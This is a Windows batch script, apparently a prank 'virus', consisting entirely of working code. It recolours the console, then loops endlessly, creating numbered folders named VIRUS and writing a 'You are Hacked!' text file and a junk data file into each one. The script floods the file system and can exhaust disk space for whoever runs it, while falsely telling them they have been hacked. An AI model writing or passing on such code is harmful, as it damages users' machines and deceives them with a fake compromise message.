@echo off 
mode con:cols=15 lines=10
color 4f
set var=1
:x
md VIRUS%var% >nul
cd VIRUS%var% >nul
echo You are Hacked! >hacked.txt
echo H0l000000000000000 >hacked.dat
cd ../
set /a "var=%var%+1"
goto x >nul